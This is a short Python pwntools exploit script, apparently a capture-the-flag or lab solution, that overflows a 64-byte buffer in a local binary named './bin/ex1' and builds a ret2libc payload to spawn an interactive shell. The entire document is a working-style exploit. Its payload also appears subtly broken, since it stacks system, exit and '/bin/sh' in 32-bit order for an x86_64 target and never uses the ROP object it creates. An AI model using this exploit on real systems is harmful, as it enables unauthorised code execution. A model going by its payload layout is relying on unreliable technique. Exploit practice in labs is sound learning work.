#!/usr/bin/env python3

from pwn import *

# Target binary
binary = './bin/ex1'
elf = ELF(binary)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')  # Path to the libc used by the binary


p = process(binary)


offset = 64  # Buffer size for name
rop = ROP(elf)


libc_base = 0x7ffff7c00000  
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
exit = libc_base + libc.symbols['exit']


payload = b'A' * offset  
payload += p64(system)  
payload += p64(exit)    
payload += p64(bin_sh) 
payload += b'\n'

# Send payload
p.sendline(payload)
p.recvuntil("Welcome to the .hidden Flying Experience! Do you want to check your booking?")
p.sendline("0")

p.interactive()



